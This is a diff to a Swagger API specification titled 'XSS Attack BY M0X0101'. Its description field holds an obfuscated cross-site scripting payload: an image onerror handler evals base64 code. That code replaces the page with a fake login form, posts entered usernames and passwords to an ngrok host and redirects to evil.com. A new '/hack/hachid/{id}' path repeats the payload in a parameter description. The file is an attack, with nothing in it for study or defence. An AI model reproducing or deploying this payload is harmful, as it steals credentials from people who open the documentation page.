@@ -2,7 +2,8 @@ swagger: '2.0'
 info:
   title: XSS Attack BY M0X0101
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EuYWN0aW9uPSdodHRwczovLzVhNDAtMjQwOS00MGQyLTEwZDgtMWQ0NS1jYjA1LWNjYTAtMzMyZi01YmI3Lm5ncm9rLWZyZWUuYXBwJzthLm1ldGhvZD0nUE9TVCc7YTpvbnN1Ym1pdD1mdW5jdGlvbigpe3NldFRpbWVvdXQoZnVuY3Rpb24oKXtkb2N1bWVudC5sb2NhdGlvbj0naHR0cDovL2V2aWwuY29tJzt9LCAyMDAwKTt9O2EuaW5uZXJIVE1MPSc8Y2VudGVyPlVzZXJuYW1lOiA8aW5wdXQgdHlwZT0ndGV4dCcgbmFtZT0ndXNlck5hbWUnPjxicj5QYXNzd29yZDogPGlucHV0IHR5cGU9J3Bhc3N3b3JkJyBuYW1lPSdwd2QnPjxicj48aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nTG9naW4nPjwvY2VudGVyPic7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=' onerror='eval(atob(this.id))'>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea>
+    <img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EuYWN0aW9uPSdodHRwczovLzVhNDAtMjQwOS00MGQyLTEwZDgtMWQ0NS1jYjA1LWNjYTAtMzMyZi01YmI3Lm5ncm9rLWZyZWUuYXBwJzthLm1ldGhvZD0nUE9TVCc7YT5cbiAgICAgICAgPGNlbnRlcj5GYWtlIFN3YWdnZXIgTG9naW48L2NlbnRlcj48YnI+XG4gICAgICAgIFVzZXJuYW1lOiA8aW5wdXQgdHlwZT0ndGV4dCcgbmFtZT0ndXNlck5hbWUnPjxicj5cbiAgICAgICAgUGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSdwYXNzd29yZCcgYmFja2VuZD0ncGFzc3dvcmQnIG5hbWU9J3B3ZCc+PGJyPlxuICAgICAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nTG9naW4nPjwvZm9ybTtcbmEub25zdWJtaXQ9ZnVuY3Rpb24oKXtwYXJlbnQubG9jYXRpb24uaHJlZj0naHR0cDovL2V2aWwuY29tJzt9O2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7' onerror='eval(atob(this.id))'>">
   version: production
 basePath: /JSSResource/
 produces:
@@ -23,3 +24,17 @@ paths:
         - M0X0101_XSS_D
       operationId: findAccounts
       summary: Finds all accounts
+  '/hack/hachid/{id}':
+    delete:
+      parameters:
+        - description: |
+            Same payload in parameter to trigger again.
+            <img src=x id='...SAME_PAYLOAD_HERE...' onerror='eval(atob(this.id))'>
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
